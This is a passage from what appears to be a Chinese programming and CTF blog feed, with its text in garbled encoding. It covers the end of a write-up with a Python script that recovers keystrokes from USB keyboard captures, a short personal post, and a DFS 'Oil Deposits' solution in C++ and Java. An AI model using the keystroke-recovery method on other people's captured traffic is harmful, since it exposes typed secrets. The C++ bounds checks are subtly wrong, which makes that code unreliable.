string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># check argv</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get argv</span>    pcapFilePath <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># get data of pcap</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"tshark -r %s -T fields -e usb.capdata > %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pcapFilePath<span class="token punctuation">,</span> DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># read data</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>DataFileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            presses<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># handle</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> press <span class="token keyword">in</span> presses<span class="token punctuation">:</span>        Bytes <span class="token operator">=</span> press<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> normalKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"02"</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># shift key is pressed.</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"01"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">"Ctrl+"</span> <span class="token operator">+</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[-] Unknow Key : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Found : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># clean the temp data</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm ./%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>å¾…æ›´æ–°ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
            <tag> ä¿¡æ¯å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æˆ‘æ˜¯ä¸€ä¸ªèœé¸¡</title>
      <link href="/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/"/>
      <url>/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="èœé¸¡"><a href="#èœé¸¡" class="headerlink" title="èœé¸¡"></a>èœé¸¡</h1><p>ä½ æ€ä¹ˆè¿™ä¹ˆèœå•Šï¼é¸½äº†äº”å¤©äº†ï¼è¦åšé¢“åºŸèœé¸¡äº†å—ğŸ˜­ï¼ä½ åˆlowåˆèœè¿˜ä¸åŠªåŠ›ï¼Œåˆæƒ³éšæ³¢é€æµï¼ˆå’¸é±¼çœŸé¦™ğŸ˜„ï¼‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ‚æ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æˆ‘æ˜¯èœé¸¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DFSæ·±æœ_Oil_Deposits</title>
      <link href="/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/"/>
      <url>/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰"><a href="#ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰" class="headerlink" title="ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰"></a>ä¸€ä¸ªDFSæ°´é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´ä¸æ°´ï¼‰</h1><h2 id="Oil-Deposits"><a href="#Oil-Deposits" class="headerlink" title="Oil Deposits"></a>Oil Deposits</h2><pre class=" language-c++"><code class="language-c++">The GeoSurvComp geologic survey company is responsible for detecting underground oil deposits.GeoSurvComp works with one large rectangular region of land at a time, and creates a grid that dividesthe land into numerous square plots. It then analyzes each plot separately, using sensing equipment todetermine whether or not the plot contains oil.A plot containing oil is called a pocket. If two pockets are adjacent, then they are part of thesame oil deposit. Oil deposits can be quite large and may contain numerous pockets. Your job is todetermine how many different oil deposits are contained in a grid.InputThe input file contains one or more grids. Each grid begins with a line containing m and n, the numberof rows and columns in the grid, separated by a single space. If m = 0 it signals the end of the input;otherwise 1 â‰¤ m â‰¤ 100 and 1 â‰¤ n â‰¤ 100. Following this are m lines of n characters each (not countingthe end-of-line characters). Each character corresponds to one plot, and is either â€˜*â€™, representing theabsence of oil, or â€˜@â€™, representing an oil pocket.OutputFor each grid, output the number of distinct oil deposits. Two different pockets are part of the sameoil deposit if they are adjacent horizontally, vertically, or diagonally. An oil deposit will not containmore than 100 pockets.</code></pre><p>sample input:</p><pre class=" language-c++"><code class="language-c++">1 1*3 5*@*@***@***@*@*1 8@@****@*5 5 ****@*@@*@*@**@@@@*@@@**@0 0</code></pre><p>sample output:</p><pre class=" language-c++"><code class="language-c++">0122</code></pre><p>å¼•ç”¨ä¸€ä¸‹ç™¾åº¦ç™¾ç§‘ï¼š</p><blockquote><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯DFS(Depth First Search)ï¼š</p><p>æ·±åº¦ä¼˜å…ˆæœç´¢æ˜¯ä¸€ç§åœ¨å¼€å‘çˆ¬è™«æ—©æœŸä½¿ç”¨è¾ƒå¤šçš„æ–¹æ³•ã€‚å®ƒçš„ç›®çš„æ˜¯è¦è¾¾åˆ°è¢«æœç´¢ç»“æ„çš„å¶ç»“ç‚¹(å³é‚£äº›ä¸åŒ…å«ä»»ä½•<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>çš„<a href="https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">HTMLæ–‡ä»¶</a>) ã€‚åœ¨ä¸€ä¸ªHTMLæ–‡ä»¶ä¸­ï¼Œå½“ä¸€ä¸ª<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>è¢«é€‰æ‹©åï¼Œè¢«é“¾æ¥çš„HTMLæ–‡ä»¶å°†æ‰§è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå³åœ¨æœç´¢å…¶ä½™çš„è¶…é“¾ç»“æœä¹‹å‰å¿…é¡»å…ˆå®Œæ•´åœ°æœç´¢å•ç‹¬çš„ä¸€æ¡é“¾ã€‚æ·±åº¦ä¼˜å…ˆæœç´¢æ²¿ç€HTMLæ–‡ä»¶ä¸Šçš„<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>èµ°åˆ°ä¸èƒ½å†æ·±å…¥ä¸ºæ­¢ï¼Œç„¶åè¿”å›åˆ°æŸä¸€ä¸ªHTMLæ–‡ä»¶ï¼Œå†ç»§ç»­é€‰æ‹©è¯¥HTMLæ–‡ä»¶ä¸­çš„å…¶ä»–è¶…é“¾ã€‚å½“ä¸å†æœ‰å…¶ä»–<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">è¶…é“¾</a>å¯é€‰æ‹©æ—¶ï¼Œè¯´æ˜æœç´¢å·²ç»ç»“æŸã€‚</p></blockquote><blockquote><p>ç»å¸¸é‡åˆ°çš„ä¸ä»…æœ‰DFSï¼Œè¿˜æœ‰BFS(Breadth First Search):</p><p>å®½åº¦ä¼˜å…ˆ<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2988274" target="_blank" rel="noopener">æœç´¢ç®—æ³•</a>ï¼ˆåˆç§°å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼‰æ˜¯æœ€ç®€ä¾¿çš„å›¾çš„æœç´¢ç®—æ³•ä¹‹ä¸€ï¼Œè¿™ä¸€ç®—æ³•ä¹Ÿæ˜¯å¾ˆå¤šé‡è¦çš„å›¾çš„ç®—æ³•çš„åŸå‹ã€‚Dijkstra<a href="https://baike.baidu.com/item/%E5%8D%95%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/6975204" target="_blank" rel="noopener">å•æºæœ€çŸ­è·¯å¾„</a>ç®—æ³•å’ŒPrim<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91" target="_blank" rel="noopener">æœ€å°ç”Ÿæˆæ ‘</a>ç®—æ³•éƒ½é‡‡ç”¨äº†å’Œå®½åº¦ä¼˜å…ˆæœç´¢ç±»ä¼¼çš„æ€æƒ³ã€‚å…¶åˆ«ååˆå«BFSï¼Œå±äºä¸€ç§ç›²ç›®æœå¯»æ³•ï¼Œç›®çš„æ˜¯ç³»ç»Ÿåœ°å±•å¼€å¹¶æ£€æŸ¥å›¾ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œä»¥æ‰¾å¯»ç»“æœã€‚æ¢å¥è¯è¯´ï¼Œå®ƒå¹¶ä¸è€ƒè™‘ç»“æœçš„å¯èƒ½ä½ç½®ï¼Œå½»åº•åœ°æœç´¢æ•´å¼ å›¾ï¼Œç›´åˆ°æ‰¾åˆ°ç»“æœä¸ºæ­¢ã€‚</p><p>BFSåœ¨æ±‚è§£æœ€çŸ­è·¯å¾„æˆ–è€…æœ€çŸ­æ­¥æ•°ä¸Šæœ‰å¾ˆå¤šçš„åº”ç”¨ã€‚åº”ç”¨æœ€å¤šçš„æ˜¯åœ¨èµ°è¿·å®«ä¸Šã€‚</p></blockquote><p>æ ¹æ®é¢˜æ„ï¼Œæˆ‘ä»¬éœ€è¦å‘å…«ä¸ªæ–¹å‘è¿›è¡Œæœç´¢ï¼Œå¹¶ä¸”è¿›è¡Œåˆ¤æ–­</p><p>å¯ä»¥ç”¨c++å†™å‡ºï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å®šä¹‰å…¨å±€çš„ï¼Œmå’Œn</span><span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ä¸»å‡½æ•°</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>flag<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ¥å—å¤šç»„æ•°æ®</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> n<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cin<span class="token operator">>></span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//å®šä¹‰æ·±åº¦ä¼˜å…ˆæœç´¢</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//è·Ÿä¸ªæ‰«æä»ªä¼¼çš„ï¼Œé€’å½’æœç´¢</span>    <span class="token comment" spellcheck="true">//å¦‚æœä¸ä¸º@æˆ–è€…è¶…å‡ºèŒƒå›´ï¼Œåˆ™åœæ­¢è¯¥æ–¹å‘æœç´¢</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'@'</span><span class="token operator">||</span>i<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>j<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>i<span class="token operator">></span>m<span class="token operator">||</span>j<span class="token operator">></span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å‘å…«ä¸ªæ–¹å‘è¿›è¡Œç»§ç»­æœç´¢</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//æ ¹æ®dfsçš„ç‰¹ç‚¹ï¼Œè®¿é—®è¿‡çš„é¡¶ç‚¹éœ€è¦æ ‡è®°(è¿™é‡Œç½®ä¸º*)ï¼Œé˜²æ­¢é‡å¤é€’å½’çˆ†ç‚¸</span>        map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>javaé‡æ„ç‰ˆ:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DFS_Oil_Deposits</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//æ³¨æ„è¿™é‡Œå› ä¸ºæ˜¯åŠ¨æ€ç”³è¯·æ•°ç»„ï¼Œä¸C++ä¸åŒï¼Œå¦‚æœä¸å…ˆåˆ¤æ–­å¥½å‚æ•°å¤§å°ï¼Œä¼šå¯¼è‡´æ•°ç»„è¶Šç•Œçš„é—®é¢˜</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>i <span class="token operator">>=</span> m <span class="token operator">||</span> j <span class="token operator">>=</span> n <span class="token operator">||</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//å‘å…«ä¸ªæ–¹å‘è¿›è¡Œç»§ç»­æœç´¢</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//æ ¹æ®dfsçš„ç‰¹ç‚¹ï¼Œè®¿é—®è¿‡çš„é¡¶ç‚¹éœ€è¦æ ‡è®°(è¿™é‡Œç½®ä¸º*)ï¼Œé˜²æ­¢é‡å¤é€’å½’çˆ†ç‚¸</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token 